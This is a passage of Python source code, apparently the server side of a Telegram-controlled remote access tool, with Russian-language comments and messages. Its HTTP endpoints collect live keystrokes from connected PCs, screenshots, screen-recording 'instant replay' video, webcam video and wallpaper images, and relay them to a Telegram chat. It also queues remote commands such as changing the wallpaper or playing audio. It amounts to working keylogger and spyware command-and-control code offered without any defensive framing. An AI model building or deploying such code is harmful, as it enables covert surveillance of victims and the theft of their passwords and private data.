                dev.setdefault('queue', []).append({
                    'type': 'change_wallpaper',
                    'photo_data_base64': photo_base64
                })
                bot.send_message(user_id, f'Меняю обои... (размер: {len(downloaded_file)} байт)', reply_markup=_make_markup(user_id))
            else:
                bot.send_message(user_id, 'Устройство не найдено', reply_markup=_make_markup(user_id))
        else:
            bot.send_message(user_id, 'Нет подключенных устройств', reply_markup=_make_markup(user_id))
    except Exception as e:
        import logging
        logging.exception(f'Ошибка обработки фото: {e}')
        bot.send_message(user_id, 'Ошибка при обработке фото', reply_markup=_make_markup(user_id))
    finally:
        user_states[user_id]['waiting_wallpaper'] = False
        user_states[user_id]['wallpaper_device'] = None

@bot.message_handler(commands=['device'])
def handle_device(message):
    user_id = message.chat.id
    _ensure_chat_lists(user_id)
    # Compatibility placeholder
    bot.send_message(user_id, 'ПК зарегистрирован.')

# Placeholder for receiving key logs
@bot.message_handler(commands=['keylog'])
def handle_keylog(message):
    user_id = message.chat.id
    if user_id in user_states and user_states[user_id]['sending']:
        key_data = message.text.replace('/keylog ', '')
        if '[ENTER]' in key_data:
            parts = key_data.split('[ENTER]')
            for part in parts[:-1]:
                if part:
                    bot.send_message(user_id, part + '[ENTER]')
        else:
            if not hasattr(bot, 'last_message_id'):
                bot.last_message_id = {}
            if user_id not in bot.last_message_id:
                sent_msg = bot.send_message(user_id, key_data)
                bot.last_message_id[user_id] = sent_msg.message_id
            else:
                try:
                    bot.edit_message_text(chat_id=user_id, message_id=bot.last_message_id[user_id], text=key_data)
                except Exception as e:
                    sent_msg = bot.send_message(user_id, key_data)
                    bot.last_message_id[user_id] = sent_msg.message_id

@app.post('/register')
def http_register():
    data = request.get_json(silent=True) or {}
    dev_id = data.get('device_id')
    name = data.get('name') or 'PC'
    has_webcam = bool(data.get('has_webcam'))
    webcams_raw = data.get('webcams') or ''
    webcams_list = []
    if isinstance(webcams_raw, str) and webcams_raw.strip():
        for part in webcams_raw.split(','):
            part = part.strip()
            if not part:
                continue
            try:
                webcams_list.append(int(part))
            except Exception:
                continue
    if not dev_id:
        return jsonify(ok=False), 400
    st = devices.get(dev_id)
    was_new = False
    if not st:
        was_new = True
        st = {
            'name': name,
            'chat_id': None,
            'sending_enabled': False,
            'muted': False,
            'screenshot': False,
            'buffer': '',
            'msg_id': None,
            'last_edit_ts': 0.0,
            'last_text': None,
            'creating': False,
            'lock': threading.Lock(),
            'queue': [],
            'announced': False,
            'has_webcam': has_webcam,
            'webcams': webcams_list,
        }
        devices[dev_id] = st
    else:
        st['name'] = name or st.get('name') or 'PC'
        st.setdefault('last_edit_ts', 0.0)
        st.setdefault('last_text', None)
        st.setdefault('creating', False)
        st.setdefault('queue', [])
        st.setdefault('announced', False)
        st['has_webcam'] = has_webcam or st.get('has_webcam', False)
        # Обновляем список камер если пришёл
        if webcams_list:
            st['webcams'] = webcams_list
    if not st.get('chat_id') and user_states:
        st['chat_id'] = next(iter(user_states.keys()))
    st['last_seen'] = time.time()
    st['connection_stable'] = True  # Mark device as actively connected
    try:
        logging.info(f"REGISTER: dev={dev_id}, name={st.get('name')}, chat_id={st.get('chat_id')}, new={was_new}")
        chat_id = st.get('chat_id')
        if chat_id and chat_id in authorized_users:
            label = f"{st.get('name', 'PC')} [{dev_id[-4:]}]"
            # Always refresh the device list to show it's still active
            connected_devices.setdefault(chat_id, [])
            if label not in connected_devices[chat_id]:
                connected_devices[chat_id].append(label)
            # Announce only new connections
            if not st.get('announced'):
                try:
                    bot.send_message(chat_id, f"ПК подключился: {label}", reply_markup=_make_markup(chat_id))
                except Exception:
                    pass
                st['announced'] = True
    except Exception:
        pass
    return jsonify(ok=True)

@app.get('/state')
def http_state():
    dev_id = request.args.get('device_id')
    st = devices.get(dev_id)
    if not st:
        # Auto-register device on state poll
        st = {
            'name': 'PC',
            'chat_id': None,
            'sending_enabled': False,
            'muted': False,
            'screenshot': False,
            'buffer': '',
            'msg_id': None,
            'last_edit_ts': 0.0,
            'last_text': None,
            'creating': False,
            'lock': threading.Lock(),
            'queue': [],
        }
        if user_states:
            st['chat_id'] = next(iter(user_states.keys()))
        devices[dev_id] = st
    st['last_seen'] = time.time()
    return jsonify(
        sending_enabled=bool(st.get('sending_enabled')),
        muted=bool(st.get('muted')),
        chat_ready=bool(st.get('chat_id')),
        screenshot=bool(st.get('screenshot')),
        chat_id=st.get('chat_id'),
    )

@app.get('/events')
def http_events():
    import logging
    dev_id = request.args.get('device_id')
    st = devices.get(dev_id)
    if not st:
        return jsonify(events=[])
    st['last_seen'] = time.time()
    q = st.get('queue') or []
    events = list(q)
    if events:
        for ev in events:
            ev_type = ev.get('type')
            if ev_type == 'change_wallpaper':
                has_photo = 'photo_data_base64' in ev
                photo_size = len(ev.get('photo_data_base64', '')) if has_photo else 0
                logging.info(f"Отправляю событие change_wallpaper: photo={has_photo}, size={photo_size}")
            else:
                logging.info(f"Отправляю событие: {ev_type}")
    st['queue'] = []
    return jsonify(events=events)

@app.post('/event')
def http_event():
    data = request.get_json(silent=True) or {}
    dev_id = data.get('device_id')
    t = data.get('type')
    ch = data.get('char') or ''
    st = devices.get(dev_id)
    if not st:
        return jsonify(ok=False), 404
    if not st.get('sending_enabled'):
        return jsonify(ok=True)
    # ensure chat binding exists
    if not st.get('chat_id') and user_states:
        st['chat_id'] = next(iter(user_states.keys()))
    # block if chat not authorized
    if st.get('chat_id') not in authorized_users:
        return jsonify(ok=True)
    st['last_seen'] = time.time()
    buf = st.get('buffer') or ''
    if t == 'key':
        # Append chunk and live-edit
        buf += ch
        st['buffer'] = buf
        _send_or_edit(st, buf)
        return jsonify(ok=True)
    elif t == 'backspace':
        if buf:
            buf = buf[:-1]
        st['buffer'] = buf
        _send_or_edit(st, buf)
        return jsonify(ok=True)
    elif t == 'delete':
        if buf:
            buf = buf[:-1]
        st['buffer'] = buf
        _send_or_edit(st, buf)
        return jsonify(ok=True)
    elif t == 'ctrl_backspace' or t == 'ctrl_delete':
        # Clear entire buffer per requested behavior
        buf = ''
        st['buffer'] = buf
        _send_or_edit(st, buf)
        return jsonify(ok=True)
    elif t == 'enter':
        # Finalize current message and start new one on next key
        st['buffer'] = ''
        st['msg_id'] = None
        return jsonify(ok=True)
    elif t == 'lang':
        # Language switch - clear buffer and start new message
        st['buffer'] = ''
        st['msg_id'] = None
        return jsonify(ok=True)
    return jsonify(ok=False), 400

def _get_local_ip():
    try:
        # Подключаемся к внешнему адресу чтобы узнать локальный IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def _broadcast_discovery():
    """Транслирует информацию о боте в сети для автообнаружения"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    
    local_ip = _get_local_ip()
    bot_info = {
        "type": "telegram_bot_server",
        "ip": local_ip,
        "port": BOT_PORT,
        "url": f"http://{local_ip}:{BOT_PORT}",
        "public_url": f"http://{ADVERTISED_IP}:{BOT_PORT}"
    }
    
    logging.info(f"🔊 Broadcasting bot discovery: {bot_info['url']}")
    
    while True:
        try:
            message = json.dumps(bot_info).encode('utf-8')
            sock.sendto(message, ('<broadcast>', 8766))
        except Exception as e:
            logging.warning(f"Broadcast failed: {e}")
        time.sleep(5)  # Транслируем каждые 5 секунд

def _run_http():
    # Запускаем broadcast в отдельном потоке
    threading.Thread(target=_broadcast_discovery, daemon=True).start()
    
    local_ip = _get_local_ip()
    logging.info(f"🌐 Bot server starting on {local_ip}:{BOT_PORT}")
    
    # Используем Waitress вместо Flask development server (для production)
    try:
        from waitress import serve
        logging.info("✅ Using Waitress (production WSGI server)")
        serve(app, host='0.0.0.0', port=BOT_PORT, threads=6, channel_timeout=300)
    except ImportError:
        logging.warning("⚠️  Waitress not found, using Flask development server (not recommended)")
        logging.warning("   Install: pip install waitress")
        app.run(host='0.0.0.0', port=BOT_PORT, debug=False, use_reloader=False, threaded=True)

@app.get('/')
def http_root():
    return jsonify(ok=True)

@app.get('/health')
def http_health():
    return jsonify(ok=True)

@app.post('/screenshot')
def http_screenshot():
    import logging
    dev_id = request.form.get('device_id') if request.form else None
    if not dev_id and request.is_json:
        data = request.get_json(silent=True) or {}
        dev_id = data.get('device_id')
    f = None
    try:
        f = request.files.get('file')
    except Exception as e:
        logging.error(f"Error getting file from request: {e}")
        f = None
    st = devices.get(dev_id)
    if not st or not f:
        logging.error(f"Screenshot rejected: device={dev_id}, has_file={f is not None}")
        return jsonify(ok=False), 400
    chat_id = st.get('chat_id')
    if not chat_id:
        logging.error(f"No chat_id for device {dev_id}")
        return jsonify(ok=False), 400
    try:
        data = f.read()
        logging.info(f"Получен скриншот от {dev_id}: {len(data)} байт, filename={f.filename}")
        bio = io.BytesIO(data)
        bio.name = f.filename or 'screenshot.png'
        bio.seek(0)
        sent = False
        # Try sending as photo first
        try:
            bot.send_photo(chat_id, bio, caption=f"Скриншот с {st.get('name', 'PC')}")
            sent = True
            logging.info(f"Скриншот отправлен как фото в чат {chat_id}")
        except Exception as e:
            logging.warning(f"Не удалось отправить как фото: {e}")
            sent = False
        # Fallback to document
        if not sent:
            try:
                bio.seek(0)
                bot.send_document(chat_id, bio, caption=f"Скриншот с {st.get('name', 'PC')}")
                sent = True
                logging.info(f"Скриншот отправлен как документ в чат {chat_id}")
            except Exception as e:
                logging.error(f"Не удалось отправить как документ: {e}")
                sent = False
        if sent:
            st['screenshot'] = False
        return jsonify(ok=sent)
    except Exception as e:
        logging.exception(f"Критическая ошибка при обработке скриншота: {e}")
        return jsonify(ok=False), 500

@app.post('/shot_done')
def http_shot_done():
    data = request.get_json(silent=True) or {}
    dev_id = data.get('device_id')
    st = devices.get(dev_id)
    if not st:
        return jsonify(ok=False), 404
    st['screenshot'] = False
    st['last_seen'] = time.time()
    return jsonify(ok=True)

@bot.message_handler(content_types=['voice', 'audio'])
def handle_audio(message):
    user_id = message.chat.id
    if user_id not in authorized_users:
        return
    
    # Check if waiting for audio
    if not user_states[user_id].get('waiting_audio'):
        bot.send_message(user_id, 'Для воспроизведения аудио нажмите кнопку "Воспроизвести звук"', reply_markup=_make_markup(user_id))
        return
        
    dev_id = user_states[user_id].get('audio_device')
    if not dev_id:
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        dev_id = actives[0][0]
    
    dev = devices.get(dev_id)
    if not dev:
        bot.send_message(user_id, 'Устройство не найдено.', reply_markup=_make_markup(user_id))
        return
        
    try:
        if message.content_type == 'voice' and message.voice:
            fi = bot.get_file(message.voice.file_id)
            dev.setdefault('queue', []).append({'type': 'play_audio', 'tg_file_path': fi.file_path, 'kind': 'voice', 'duration': message.voice.duration})
            bot.send_message(user_id, 'Воспроизвожу голосовое на ПК.', reply_markup=_make_markup(user_id))
        elif message.content_type == 'audio' and message.audio:
            fi = bot.get_file(message.audio.file_id)
            dev.setdefault('queue', []).append({'type': 'play_audio', 'tg_file_path': fi.file_path, 'kind': 'audio', 'title': message.audio.file_name or message.audio.title or '', 'mime': message.audio.mime_type or ''})
            bot.send_message(user_id, 'Воспроизвожу аудио на ПК.', reply_markup=_make_markup(user_id))
    except Exception as e:
        logging.exception(f"Ошибка обработки аудио: {e}")
        bot.send_message(user_id, 'Ошибка при обработке аудио', reply_markup=_make_markup(user_id))
    finally:
        user_states[user_id]['waiting_audio'] = False
        user_states[user_id]['audio_device'] = None

@app.post('/replay')
def http_replay():
    import logging
    dev_id = request.form.get('device_id') if request.form else None
    if not dev_id and request.is_json:
        data = request.get_json(silent=True) or {}
        dev_id = data.get('device_id')
    f = None
    try:
        f = request.files.get('file')
    except Exception as e:
        logging.error(f"Error getting file from request: {e}")
        f = None
    st = devices.get(dev_id)
    if not st or not f:
        logging.error(f"Replay rejected: device={dev_id}, has_file={f is not None}")
        return jsonify(ok=False), 400

    # Определяем целевой chat_id:
    # 1) если клиент прислал явный chat_id в запросе, используем его
    # 2) иначе падаем обратно на chat_id, сохранённый в состоянии устройства
    chat_id = None
    try:
        if request.form:
            chat_id = request.form.get('chat_id')
        if not chat_id and request.is_json:
            data_json = request.get_json(silent=True) or {}
            chat_id = data_json.get('chat_id')
    except Exception:
        chat_id = None
    if not chat_id:
        chat_id = st.get('chat_id')
    if not chat_id:
        logging.error(f"No chat_id for device {dev_id}")
        return jsonify(ok=False), 400
    try:
        data = f.read()
        logging.info(f"Получен Instant Replay от {dev_id}: {len(data)} байт, filename={f.filename}")
        bio = io.BytesIO(data)
        bio.name = f.filename or 'instant_replay.mp4'
        bio.seek(0)
        sent = False
        # Try sending as video first
        try:
            duration = len(st.get('replay_buffer', [])) / 15 if 'replay_buffer' in st else 30
            bot.send_video(chat_id, bio, caption=f"⏮️ Instant Replay ({duration:.1f}s) с {st.get('name', 'PC')}")
            sent = True
            logging.info(f"Instant Replay отправлен как видео в чат {chat_id}")
        except Exception as e:
            logging.warning(f"Не удалось отправить как видео: {e}")
            sent = False
        # Fallback to document
        if not sent:
            try:
                bio.seek(0)
                bot.send_document(chat_id, bio, caption=f"⏮️ Instant Replay с {st.get('name', 'PC')}")
                sent = True
                logging.info(f"Instant Replay отправлен как документ в чат {chat_id}")
            except Exception as e:
                logging.error(f"Не удалось отправить как документ: {e}")
                sent = False
        return jsonify(ok=sent)
    except Exception as e:
        logging.exception(f"Критическая ошибка при обработке Instant Replay: {e}")
        return jsonify(ok=False), 500

@app.post('/replay_webcam')
def http_replay_webcam():
    import logging
    dev_id = request.form.get('device_id') if request.form else None
    if not dev_id and request.is_json:
        data = request.get_json(silent=True) or {}
        dev_id = data.get('device_id')
    f = None
    try:
        f = request.files.get('file')
    except Exception as e:
        logging.error(f"Error getting file from request (webcam): {e}")
        f = None
    st = devices.get(dev_id)
    if not st or not f:
        logging.error(f"Replay WEBCAM rejected: device={dev_id}, has_file={f is not None}")
        return jsonify(ok=False), 400

    # Аналогично обычному реплею: сначала пробуем chat_id из запроса, потом из состояния
    chat_id = None
    try:
        if request.form:
            chat_id = request.form.get('chat_id')
        if not chat_id and request.is_json:
            data_json = request.get_json(silent=True) or {}
            chat_id = data_json.get('chat_id')
    except Exception:
        chat_id = None
    if not chat_id:
        chat_id = st.get('chat_id')
    if not chat_id:
        logging.error(f"No chat_id for device {dev_id} (webcam)")
        return jsonify(ok=False), 400
    try:
        data = f.read()
        logging.info(f"Получен Webcam Replay от {dev_id}: {len(data)} байт, filename={f.filename}")
        bio = io.BytesIO(data)
        bio.name = f.filename or 'webcam_replay.mp4'
        bio.seek(0)
        sent = False
        try:
            bot.send_video(chat_id, bio, caption=f"📷 Webcam Replay с {st.get('name', 'PC')}")
            sent = True
            logging.info(f"Webcam Replay отправлен как видео в чат {chat_id}")
        except Exception as e:
            logging.warning(f"Не удалось отправить Webcam Replay как видео: {e}")
            sent = False
        if not sent:
            try:
                bio.seek(0)
                bot.send_document(chat_id, bio, caption=f"📷 Webcam Replay с {st.get('name', 'PC')}")
                sent = True
                logging.info(f"Webcam Replay отправлен как документ в чат {chat_id}")
            except Exception as e:
                logging.error(f"Не удалось отправить Webcam Replay как документ: {e}")
                sent = False
        return jsonify(ok=sent)
    except Exception as e:
        logging.exception(f"Критическая ошибка при обработке Webcam Replay: {e}")
        return jsonify(ok=False), 500

@app.post('/current_wallpaper')
def http_current_wallpaper():
    import logging
    dev_id = request.form.get('device_id') if request.form else None
    if not dev_id and request.is_json:
        data = request.get_json(silent=True) or {}
        dev_id = data.get('device_id')
    f = None
    try:
        f = request.files.get('file')
    except Exception as e:
        logging.error(f"Error getting file from request: {e}")
        f = None
    st = devices.get(dev_id)
    if not st or not f:
        logging.error(f"Wallpaper rejected: device={dev_id}, has_file={f is not None}")
        return jsonify(ok=False), 400
    chat_id = st.get('chat_id')
    if not chat_id:
        logging.error(f"No chat_id for device {dev_id}")
        return jsonify(ok=False), 400
    try:
        data = f.read()
        logging.info(f"Получены обои от {dev_id}: {len(data)} байт, filename={f.filename}")
        bio = io.BytesIO(data)
        bio.name = f.filename or 'wallpaper.jpg'
        bio.seek(0)
        sent = False
        # Try sending as photo first
        try:
            bot.send_photo(chat_id, bio, caption=f"📥 Текущие обои с {st.get('name', 'PC')}")
            sent = True
            logging.info(f"Обои отправлены как фото в чат {chat_id}")
        except Exception as e:
            logging.warning(f"Не удалось отправить как фото: {e}")
            sent = False
        # Fallback to document
        if not sent:
            try:
                bio.seek(0)
                bot.send_document(chat_id, bio, caption=f"📥 Текущие обои с {st.get('name', 'PC')}")
                sent = True
                logging.info(f"Обои отправлены как документ в чат {chat_id}")
            except Exception as e:
                logging.error(f"Не удалось отправить как документ: {e}")
                sent = False
        return jsonify(ok=sent)
    except Exception as e:
        logging.exception(f"Критическая ошибка при обработке обоев: {e}")
        return jsonify(ok=False), 500

if __name__ == '__main__':
    threading.Thread(target=_run_http, daemon=True).start()
    print('Бот запущен. Ожидаю сообщения...')
    bot.infinity_polling(timeout=20, long_polling_timeout=20)
